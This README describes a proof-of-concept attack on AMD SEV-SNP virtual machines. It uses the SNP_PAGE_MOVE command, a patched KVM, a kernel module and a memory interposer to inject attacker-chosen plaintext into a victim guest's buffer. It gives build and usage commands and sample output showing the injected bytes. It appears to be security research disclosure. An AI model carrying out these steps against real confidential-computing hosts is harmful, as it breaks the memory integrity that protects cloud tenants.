# Exploiting SNP_PAGE_MOVE

This is a PoC for the ciphertext and plaintext injection attacks on an SEV-SNP VM. It assumes a cooperative
debug scenario where a victim and attack are manually synchronized through a
CLI interface.

A demonstration video is available in [sev-page-move.webm](sev-page-move.webm).

The victim VM will:
* Initialize its buffer with all zeros.
* Initialize a second data buffer with all 0xaa
* Wait
* Print its buffer.

The attacker aims to modify the plaintext contents of the victim buffer by leveraging the `SNP_PAGE_MOVE` command.

## Build

Building this PoC requires you to follow the README in `../snp_page_move` to apply the KVM patch to your kernel. You will only need to rebuild the KVM and CCP module, not the whole kernel. The folder contains a README with more instructions.

Afterwards, you can build the attack code with `make`.

This will build the following artifact:
- `./build/binaries/ddrop-vm-victim`

## Use

1) Issue `sudo insmod <path to kmod_movepage.ko>` to load the kernel module that facilitates SEV page moving
2) Copy `ddrop-vm-victim` to the VM and run it with sudo. Let <VICTIM_GPA> be the GPA of the first buffer shown, and <DATA_GPA> be the GPA of the second data buffer.
3) On the host, choose an affected HPA
4) First prime the affected HPA using the databuffer by moving the second page onto that HPA and back: `sudo ./movepage <PID> <DATA_GPA> <TARGET_HPA> && sudo ./movepage <PID> <DATA_GPA> <ORIGINAL_HPA>`
5) Enable the interposer and move the victim page to the target HPA: `sudo ./movepage <PID> <VICTIM_GPA> <TARGET_HPA>`

If successful, the final value for the memory buffer displayed by `ddrop-vm-victim` should contain `0xaa` instead of all zeros. Note that not all lines will be affected due to subchannel interleaving. See below for expected output.


## Example output

If the attack was successful, certain cache lines within the victim buffer should contain `0xaa`. Note that not all cache lines are affected due to subchannel interleaving. 

### SEV-SNP Victim

```
$ sudo ./ddrop-vm-victim
Allocated memory buffer of 4096 bytes
 --> Guest virtual address:  0x732eedb01000
 --> Guest physical address: 0x7635f000

Buffer initialized to zero:
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

Allocated data buffer of 4096 bytes, initialized with 0xaa
 --> Guest virtual address:  0x732eedb00000
 --> Guest physical address: 0x767b4000

Move pages, then press enter

Printing memory buffer
aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```
